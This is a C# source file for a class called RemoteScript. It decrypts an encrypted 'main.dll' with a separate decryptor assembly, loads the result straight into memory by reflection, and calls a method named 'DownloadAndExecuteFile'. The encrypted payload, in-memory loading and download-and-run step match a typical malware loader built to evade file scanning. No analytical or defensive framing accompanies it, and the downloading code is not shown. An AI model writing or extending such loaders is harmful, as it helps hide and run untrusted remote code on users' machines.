using System;
using System.IO;
using System.Reflection;
using System.Threading.Tasks;

public class RemoteScript
{
    public async Task ExecuteAsync()
    {
        string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
        string encryptedDllPath = Path.Combine(currentDirectory, "main.dll");
        string decryptorDllPath = Path.Combine(currentDirectory, "Decryptor.dll");

        if (!File.Exists(encryptedDllPath))
        {
            Console.WriteLine("Encrypted DLL not found.");
            return;
        }

        if (!File.Exists(decryptorDllPath))
        {
            Console.WriteLine("Decryptor DLL not found.");
            return;
        }

        byte[] decryptedDll = DecryptFile(encryptedDllPath, decryptorDllPath);
        await ExecuteDecryptedDll(decryptedDll);
    }

    private byte[] DecryptFile(string encryptedDllPath, string decryptorDllPath)
    {
        Assembly decryptorAssembly = Assembly.LoadFile(decryptorDllPath);
        Type decryptorType = decryptorAssembly.GetType("Decryptor.FileHelper");
        MethodInfo decryptMethod = decryptorType.GetMethod("DecryptFile");
        object decryptorInstance = Activator.CreateInstance(decryptorType);

        byte[] decryptedDll = (byte[])decryptMethod.Invoke(decryptorInstance, new object[] { encryptedDllPath });
        return decryptedDll;
    }

    private async Task ExecuteDecryptedDll(byte[] fileBytes)
    {
        Assembly assembly = Assembly.Load(fileBytes);
        Type type = assembly.GetType("main.Class1");
        object instance = Activator.CreateInstance(type);
        MethodInfo method = type.GetMethod("DownloadAndExecuteFile");
        await (Task)method.Invoke(instance, null);
    }
}
